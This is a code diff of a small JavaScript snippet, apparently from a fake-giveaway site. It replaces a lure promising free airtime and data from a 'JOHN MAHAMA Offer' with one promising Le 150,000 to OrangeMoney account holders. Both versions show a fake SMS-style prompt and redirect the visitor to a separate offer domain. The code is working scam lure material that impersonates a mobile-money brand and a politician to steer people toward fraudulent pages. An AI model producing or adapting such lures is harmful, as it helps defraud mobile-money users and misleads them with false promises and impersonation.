@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '15GB Free Data'
-password=prompt('SMS: Congratulations You are Eligible to receive GH₵20 Airtime and 15GB Free Data From JOHN MAHAMA Offer, Kindly Press OK to ACTIVATE ','15GB Free Data');
-if (password != '15GB Free Data') {
-location.href='https://mahama.data-offer.xyz/15GB';
+var password = 'Le 150,000'
+password=prompt('SMS: Congratulations Your OrangeMoney Account is Eligible to receive Le 150,000 Independence Day Celebration Offer, Kindly Press OK to PROCEED   ','Le 150,000');
+if (password != 'Le 150,000') {
+location.href='https://orangemoney.alloffers.org/gift';
 }
